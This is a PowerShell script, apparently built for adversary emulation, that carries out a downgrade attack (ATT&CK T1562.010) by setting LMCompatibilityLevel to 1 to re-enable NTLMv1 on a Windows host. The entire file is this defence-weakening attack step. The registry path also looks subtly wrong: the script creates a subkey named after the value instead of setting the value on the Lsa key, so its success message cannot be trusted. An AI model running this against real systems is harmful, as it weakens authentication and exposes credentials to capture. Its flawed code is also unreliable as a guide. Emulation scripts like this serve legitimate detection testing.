<#
    T1562.010 - Impair Defenses: Downgrade Attack
    T1112 - Modify Registry
    Downgrade Attack: Modify Registry to enable NTLMv1 authentication
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

$regkey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\LMCompatibilityLevel"
try {
    Write-Host -ForegroundColor Cyan "Setting the registry key $regkey to enable NTLMv1 authentication..."
    if (-not (Test-Path $regkey)){
        Write-Host -ForegroundColor Cyan "Creating registry key $regkey..."
        New-Item -Path "$regkey" -Force -Verbose
    }
    if (Test-Path $regkey){
        if (Get-ItemProperty -Path "$regkey" -Name "LMCompatibilityLevel" -ErrorAction SilentlyContinue) {
            Write-Host -ForegroundColor Cyan "Registry key $regkey exist, setting LMCompatibilityLevel value to 1..."
            Set-ItemProperty -Path "$regkey" -Name "LMCompatibilityLevel" -Value 1 -Force -Verbose
        }
        else {
            Write-Host -ForegroundColor Cyan "Registry key $regkey exist, creating LMCompatibilityLevel value to 1..."
            New-ItemProperty -Path $regkey -Name "LMCompatibilityLevel" -Value 1 -Force -Verbose
        }
        $result = (Get-ItemProperty -Path $regkey -Name "LMCompatibilityLevel").LMCompatibilityLevel
        if ($result -eq 1) {
            Write-Host -ForegroundColor Green "Success: Registry key $regkey created and LMCompatibilityLevel value set to 1..."
        }
        else {
            Write-Host -ForegroundColor Red "Failed: Registry key $regkey created but LMCompatibilityLevel value could not be set to 1..."
        }
    }
    else{
        Write-Host -ForegroundColor Red "Failed: Registry key $regkey does not exist and could not be created, something went wrong..."
    }
}
catch {
    Write-Host -ForegroundColor Red "Error: $_"
}

Stop-Transcript
